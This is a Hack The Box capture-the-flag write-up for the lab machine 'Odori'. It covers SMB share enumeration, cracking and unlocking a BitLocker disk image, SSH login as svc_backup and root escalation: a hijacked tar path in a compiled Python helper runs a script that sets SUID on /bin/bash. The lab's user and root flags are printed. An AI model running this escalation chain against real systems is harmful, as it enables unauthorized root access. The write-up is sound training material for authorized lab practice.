
# HTB — Odori | Penetration Testing Writeup

> **Platform:** Hack The Box  
> **Target:** Odori  
> **Target IP:** `10.129.234.54`  
> **Hostname:** `ODORI`  
> **Operating System:** Linux  
> **Access Level:** `svc_backup` → Root  
> **Difficulty:** Not specified

---
<img width="1601" height="416" alt="image" src="https://github.com/user-attachments/assets/3d1631cd-22fe-448d-b2f4-3c51172b5a44" />

## Table of Contents

- [1. Initial Enumeration](#1-initial-enumeration)
- [2. SMB Enumeration](#2-smb-enumeration)
- [3. Backup Share Analysis](#3-backup-share-analysis)
- [4. BitLocker Disk Analysis](#4-bitlocker-disk-analysis)
- [5. SSH Access](#5-ssh-access)
- [6. User Flag](#6-user-flag)
- [7. Privilege Escalation](#7-privilege-escalation)
- [8. Root Flag](#8-root-flag)
- [9. Attack Path Summary](#9-attack-path-summary)
- [10. Important Commands](#10-important-commands)

---

## 1. Initial Enumeration

Started with an Nmap scan to identify open ports and running services.

<img width="1732" height="550" alt="image" src="https://github.com/user-attachments/assets/354bdfcd-f1d1-4103-811a-1d73480b7c34" />

### Command

```bash
nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54
```

### Results

| Port | State | Service | Version |
|---|---|---|---|
| 22/tcp | Open | SSH | OpenSSH 8.9p1 Ubuntu |
| 139/tcp | Open | NetBIOS-SSN | Samba smbd 4 |
| 445/tcp | Open | SMB | Samba smbd 4 |



<img width="1402" height="757" alt="image" src="https://github.com/user-attachments/assets/6ae65c80-5f7a-45d2-a939-08b291b6b401" />


### Additional Findings

- NetBIOS Name: `ODORI`
- OS: Linux
- SMB dialect: 3.1.1
- SMB Signing: Enabled but not required

**Observation:** SMB ports 139 and 445 were open, making SMB enumeration the next step.

---

## 2. SMB Enumeration

Enumerated available SMB shares.

### Command

```bash
smbclient -L 10.129.234.54
```
<img width="1621" height="368" alt="image" src="https://github.com/user-attachments/assets/b1a552d9-5418-47b4-949c-9c9b592b242a" />

### Discovered Shares

| Share | Type | Description |
|---|---|---|
| print$ | Disk | Printer Drivers |
| backup | Disk | Server Backups |
| IPC$ | IPC | IPC Service |

The SMB1 workgroup listing returned a protocol negotiation error. However, the `backup` share was accessible directly.

---

## 3. Backup Share Analysis

Connected to the backup share.

<img width="1416" height="354" alt="image" src="https://github.com/user-attachments/assets/a8af2299-2e9b-4cec-b237-428ec6483902" />

### Command

```bash
smbclient //10.129.234.54/backup
```

Listed available files:

```text
ls
```

### Output

```text
.
..
info.txt
```

Downloaded the file:

```text
get info.txt
```

Read the downloaded file:

```bash
cat info.txt
```

**Finding:** Successfully accessed the SMB backup share and downloaded `info.txt`.

---

## 4. BitLocker Disk Analysis

The disk image was analyzed to access its contents.

### 4.1 Convert VMDK to RAW

```bash
qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw
```

### 4.2 Extract BitLocker Hash

```bash
bitlocker2john -i file02.raw > hash
```

Check extracted hash:

```bash
cat hash
```

### 4.3 Attempt Password Recovery

```bash
john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Check the result:

```bash
john --show --format=bitlocker hash
```

> Note: The command was executed, but the supplied evidence does not confirm whether the BitLocker password was recovered.

### 4.4 Attach the RAW Image

```bash
sudo losetup -Pf --show file02.raw
```

Inspect partitions:

```bash
lsblk
```

Observed loop device:

```text
/dev/loop0
```

The selected BitLocker partition was:

```text
/dev/loop0p3
```

### 4.5 Unlock BitLocker Volume

Create mount directories:

```bash
sudo mkdir -p /media/bitlocker /media/mount
```

Unlock the volume:

```bash
sudo dislocker -V /dev/loop0p3 -u'123456789' -- /media/bitlocker
```

Mount the decrypted filesystem:

```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/mount
```

### 4.6 Inspect Files

```bash
ls -la /media/mount/
```

Inspect Scripts directory:

```bash
ls -la /media/mount/Scripts/
```

Read the backup script:

```bash
cat /media/mount/Scripts/backup.ps1
```

### Findings from backup.ps1

The script contained backup-related configuration:

- Source directory: `C:\data`
- SMB destination: `\\odori.vl\backup`
- SFTP configuration

**Security Note:** Credentials and secrets should be redacted before publishing this writeup.

---

## 5. SSH Access

After obtaining access to the `svc_backup` account, connected through SSH.


<img width="1518" height="719" alt="image" src="https://github.com/user-attachments/assets/f2e05cb5-98c3-402c-8e2f-8ac904c7b80e" />

### Command

```bash
ssh svc_backup@10.129.234.54
```

On the first connection, SSH asked to verify the host authenticity.

```text
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
```

Accepted the host key and continued with password authentication.

### Confirm Current Directory

```bash
pwd
```

Output:

```text
/home/svc_backup
```

List files:

```bash
ls
```

Output:

```text
user.txt
```

---

## 6. User Flag

Read the user flag:

```bash
cat user.txt
```

### User Flag

```text
46d2a58ac3b4fe18c89c1918584a134e
```

<details>
<summary>Click to view user flag</summary>

```text
46d2a58ac3b4fe18c89c1918584a134e
```

</details>

---

## 7. Privilege Escalation

The privilege escalation involved the archiver application and its `tar` executable path.

### 7.1 Modify the Archiver Helper

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc
```

This redirected the referenced `tar` path to:

```text
/tmp/bin/tar
```

### 7.2 Create a Custom tar Script

Create the directory:

```bash
mkdir -p /tmp/bin/
```

Create the replacement script:

```bash
echo '#!/bin/bash' > /tmp/bin/tar
echo 'chmod u+s /bin/bash' >> /tmp/bin/tar
```

Make it executable:

```bash
chmod +x /tmp/bin/tar
```

### 7.3 Modify the Timestamp

```bash
touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient
```

This set the timestamp on the `/backup/ancient` file.

### 7.4 Verify Bash Permissions

```bash
ls -l /bin/bash
```

### Output

```text
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

The `s` in the owner's execute position indicates that the SUID bit was enabled.

### 7.5 Spawn a Privileged Shell

```bash
/bin/bash -p
```

Verify the current identity:

```bash
id
```

### Output

```text
uid=1001(svc_backup) gid=1001(svc_backup) euid=0(root) groups=1001(svc_backup)
```

**Result:** The effective UID was `0`, confirming root-level effective privileges.

---

## 8. Root Flag

After obtaining the privileged shell, accessed the root flag.

### Command

```bash
cat /root/root.txt
```

### Root Flag

```text
50232d046cad17e2e3ee9abba70a6699
```

<details>
<summary>Click to view root flag</summary>

```text
50232d046cad17e2e3ee9abba70a6699
```

</details>

<badge>Root access confirmed</badge>

---

## 9. Attack Path Summary

```text
                 Target: ODORI
                       |
                       v
                Nmap Enumeration
                       |
                       v
                SMB Enumeration
                       |
                       v
                 Backup Share
                       |
                       v
               info.txt Download
                       |
                       v
              BitLocker Disk Analysis
                       |
                       v
                 SSH Access
                       |
                       v
               svc_backup Account
                       |
                       v
                  User Flag
                       |
                       v
             Archiver Path Hijacking
                       |
                       v
               Timestamp Modification
                       |
                       v
                 SUID Bash
                       |
                       v
                 bash -p
                       |
                       v
                  ROOT ACCESS
                       |
                       v
                   Root Flag
```

### Attack Chain

1. Identified SSH and SMB services using Nmap.
2. Enumerated SMB shares.
3. Accessed the `backup` share.
4. Downloaded `info.txt`.
5. Analyzed the BitLocker-protected disk image.
6. Accessed the `svc_backup` account through SSH.
7. Retrieved the user flag.
8. Modified the archiver helper's `tar` path.
9. Created a custom `tar` script.
10. Modified the timestamp of `/backup/ancient`.
11. Obtained SUID permissions on `/bin/bash`.
12. Spawned a privileged shell using `bash -p`.
13. Retrieved the root flag.

---

## 10. Important Commands

### Network Enumeration

```bash
nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54
```

### SMB Enumeration

```bash
smbclient -L 10.129.234.54
smbclient //10.129.234.54/backup
```

### SMB File Download

```text
ls
get info.txt
```

### BitLocker Analysis

```bash
qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw
bitlocker2john -i file02.raw > hash
john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show --format=bitlocker hash
```

### Disk Mounting

```bash
sudo losetup -Pf --show file02.raw
lsblk
sudo mkdir -p /media/bitlocker /media/mount
sudo dislocker -V /dev/loop0p3 -u'123456789' -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/mount
```

### SSH

```bash
ssh svc_backup@10.129.234.54
```

### Privilege Escalation

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc

mkdir -p /tmp/bin/

echo '#!/bin/bash' > /tmp/bin/tar
echo 'chmod u+s /bin/bash' >> /tmp/bin/tar

chmod +x /tmp/bin/tar

touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient

ls -l /bin/bash

/bin/bash -p

id
```

### Flag Retrieval

```bash
cat user.txt
cat /root/root.txt
```

---

## Disclaimer

This writeup is intended for educational purposes and authorized Hack The Box lab practice only.

All techniques described here should only be used against systems for which explicit permission has been granted.

**Author:** MR-R00TX  
**Focus:** Offensive Security | Web Application Security | Penetration Testing
